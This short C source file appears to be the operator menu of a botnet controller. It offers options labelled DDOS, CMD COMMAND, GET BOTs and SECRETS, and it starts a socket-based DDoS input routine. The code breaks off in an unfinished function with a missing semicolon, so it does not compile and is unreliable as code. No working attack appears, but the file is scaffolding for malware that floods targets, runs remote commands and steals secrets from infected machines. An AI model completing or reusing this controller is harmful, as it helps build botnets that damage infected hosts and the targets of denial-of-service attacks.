#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>

#include "admin.h"

uint8_t input() {
    uint8_t action;

    while (1) {
        printf("\n");
        printf("\033[94m[01] DDOS\033[0m\n");
        printf("\033[94m[02] PING\033[0m\n");
        printf("\033[94m[03] CMD COMMAND\033[0m\n");
        printf("\033[94m[04] GET BOTs\033[0m\n");
        printf("\033[94m[05] SECRETS\033[0m\n");

        printf("\n\033[31m[~]\033[0m \033[32mSelect an option:\033[0m ");
        scanf("%hhu", &action);

        if (action < 1 || action > 5) {
            printf("\033[31mInvalid selection: %d. Try again.\033[0m\n", action);
            continue;
        }

        break;
    }

    return action;
}

void ddos_input(SOCKET sock) {
    char urls[4098];

    printf("[!]")
}
